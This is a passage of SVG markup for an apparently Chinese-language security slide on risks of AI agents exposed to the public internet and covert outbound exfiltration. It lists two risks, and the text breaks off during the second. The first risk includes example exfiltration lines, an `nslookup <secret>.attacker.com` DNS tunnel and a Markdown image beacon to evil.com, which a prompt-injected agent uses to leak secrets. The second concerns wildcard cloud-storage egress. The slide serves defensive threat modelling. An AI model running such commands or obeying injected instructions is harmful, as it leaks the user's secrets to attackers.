  <text x="212" y="168" text-anchor="middle" fill="#fecaca" font-size="15" font-weight="800">🚨 1. AI 公网暴露与隐蔽出站外泄三大风险</text>

  <rect x="46" y="196" width="333" height="98" rx="8" fill="#1f121b" stroke="#7f1d1d" stroke-width="1"/>
  <text x="60" y="218" fill="#f87171" font-size="13" font-weight="700">① DNS 隧道与 Markdown 图片信标外泄 (BRK-829)</text>
  <text x="60" y="240" fill="#cbd5e1" font-size="12">即使封锁了容器直接 HTTP 出站，受注入 Agent</text>
  <text x="60" y="258" fill="#cbd5e1" font-size="12">仍可通过 `nslookup &lt;secret&gt;.attacker.com` 或渲染</text>
  <text x="60" y="278" fill="#fca5a5" font-size="12" font-weight="700">`![img](https://evil.com/leak?d=...)` 窃走核心机密！</text>

  <rect x="46" y="306" width="333" height="98" rx="8" fill="#1f121b" stroke="#7f1d1d" stroke-width="1"/>
  <text x="60" y="328" fill="#f87171" font-size="13" font-weight="700">② 共享公网网关绕过与云租户数据搬家</text>
  <text x="60" y="350" fill="#cbd5e1" font-size="12">未关闭 PaaS 公网访问或放行 `*.blob.core.windows.net`</text>
  <text x="60" y="368" fill="#cbd5e1" font-size="12">通配符出站，导致攻击者用外部订阅 Storage Key</text>
